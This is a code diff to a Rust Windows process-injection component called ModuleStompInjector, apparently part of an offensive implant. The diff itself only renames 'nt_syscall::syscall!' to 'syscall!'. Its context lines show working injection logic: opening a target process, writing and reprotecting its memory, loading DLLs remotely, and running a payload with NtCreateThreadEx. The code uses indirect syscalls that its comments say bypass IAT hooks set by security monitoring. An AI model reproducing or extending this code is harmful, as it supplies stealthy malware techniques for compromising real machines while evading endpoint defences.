@@ -125,7 +125,7 @@ unsafe fn collect_peb_candidates(
 macro_rules! nt_read_proc {
     ($hproc:expr, $base:expr, $buf:expr) => {{
         let mut _br: usize = 0;
-        let _s = nt_syscall::syscall!(
+        let _s = syscall!(
             "NtReadVirtualMemory",
             $hproc as u64, $base as u64,
             $buf as *mut _ as u64, std::mem::size_of_val($buf) as u64,
@@ -135,7 +135,7 @@ macro_rules! nt_read_proc {
     }};
     ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
         let mut _br: usize = 0;
-        let _s = nt_syscall::syscall!(
+        let _s = syscall!(
             "NtReadVirtualMemory",
             $hproc as u64, $base as u64,
             $buf as *mut _ as u64, $len as u64,
@@ -150,7 +150,7 @@ macro_rules! nt_read_proc {
 macro_rules! nt_write_proc {
     ($hproc:expr, $base:expr, $buf:expr, $len:expr) => {{
         let mut _bw: usize = 0;
-        let _s = nt_syscall::syscall!(
+        let _s = syscall!(
             "NtWriteVirtualMemory",
             $hproc as u64, $base as u64,
             $buf as *const _ as u64, $len as u64,
@@ -166,7 +166,7 @@ macro_rules! nt_alloc_proc {
     ($hproc:expr, $size:expr, $prot:expr) => {{
         let mut _base: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut _sz: usize = $size;
-        let _s = nt_syscall::syscall!(
+        let _s = syscall!(
             "NtAllocateVirtualMemory",
             $hproc as u64, &mut _base as *mut _ as u64,
             0u64, &mut _sz as *mut _ as u64,
@@ -187,7 +187,7 @@ macro_rules! nt_free_proc {
     ($hproc:expr, $base:expr) => {{
         let mut _fb = $base as usize;
         let mut _fs: usize = 0;
-        nt_syscall::syscall!(
+        syscall!(
             "NtFreeVirtualMemory",
             $hproc as u64, &mut _fb as *mut _ as u64,
             &mut _fs as *mut _ as u64, 0x8000u64,
@@ -202,7 +202,7 @@ macro_rules! nt_protect_proc {
         let mut _pb = $base as usize;
         let mut _ps = $size;
         let mut _old: u32 = 0;
-        let _s = nt_syscall::syscall!(
+        let _s = syscall!(
             "NtProtectVirtualMemory",
             $hproc as u64, &mut _pb as *mut _ as u64,
             &mut _ps as *mut _ as u64,
@@ -287,7 +287,7 @@ impl Injector for ModuleStompInjector {
                 | PROCESS_VM_READ
                 | PROCESS_CREATE_THREAD
                 | PROCESS_QUERY_INFORMATION) as u64;
-            let open_status = nt_syscall::syscall!(
+            let open_status = syscall!(
                 "NtOpenProcess",
                 &mut h_proc_val as *mut _ as u64,
                 access_mask,
@@ -302,7 +302,7 @@ impl Injector for ModuleStompInjector {
             let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
 
             macro_rules! close_h {
-                () => { nt_syscall::syscall!("NtClose", h_proc as u64).ok(); };
+                () => { syscall!("NtClose", h_proc as u64).ok(); };
             }
             macro_rules! cleanup_and_err {
                 ($msg:expr) => {{ close_h!(); return Err(anyhow!($msg)); }};
@@ -477,7 +477,7 @@ impl Injector for ModuleStompInjector {
                     // (NtCreateThreadEx resolved through nt_syscall which uses
                     // SSN + syscall gadget, not through IAT).
                     let mut h_thread: usize = 0;
-                    let thread_status = nt_syscall::syscall!(
+                    let thread_status = syscall!(
                         "NtCreateThreadEx",
                         &mut h_thread as *mut _ as u64,
                         THREAD_ACCESS_WAITABLE as u64,
@@ -505,7 +505,7 @@ impl Injector for ModuleStompInjector {
                                     "module_stomp: LdrLoadDll remote thread timed out after {}ms for {}",
                                     LDRLOADDLL_TIMEOUT_MS, candidate
                                 );
-                                nt_syscall::syscall!(
+                                syscall!(
                                     "NtTerminateThread",
                                     h_thread as u64,
                                     1u64
@@ -516,7 +516,7 @@ impl Injector for ModuleStompInjector {
                                     wait, candidate
                                 );
                             }
-                            nt_syscall::syscall!("NtClose", h_thread as u64).ok();
+                            syscall!("NtClose", h_thread as u64).ok();
                         }
                         Ok(s) => {
                             log::warn!(
@@ -669,17 +669,17 @@ impl Injector for ModuleStompInjector {
             }
 
             // Flush I-cache (defense-in-depth on ARM64, no-op on x86_64).
-            nt_syscall::syscall!(
+            syscall!(
                 "NtFlushInstructionCache",
                 h_proc as u64, target_addr as u64, payload.len() as u64,
             ).ok();
 
             // ── Execute via NtCreateThreadEx (indirect syscall) ─────────────
-            // The nt_syscall::syscall! macro resolves NtCreateThreadEx's SSN
+            // The syscall! macro resolves NtCreateThreadEx's SSN
             // and dispatches through a syscall gadget in ntdll, bypassing any
             // IAT hooks on CreateRemoteThread or NtCreateThreadEx.
             let mut h_exec_thread: usize = 0;
-            let exec_status = nt_syscall::syscall!(
+            let exec_status = syscall!(
                 "NtCreateThreadEx",
                 &mut h_exec_thread as *mut _ as u64,
                 THREAD_ACCESS_FIRE_AND_FORGET as u64,
@@ -697,7 +697,7 @@ impl Injector for ModuleStompInjector {
 
             match exec_status {
                 Ok(s) if s >= 0 && !h_exec_thread.is_null() => {
-                    nt_syscall::syscall!("NtClose", h_exec_thread as u64).ok();
+                    syscall!("NtClose", h_exec_thread as u64).ok();
                 }
                 Ok(s) => {
                     cleanup_and_err!(
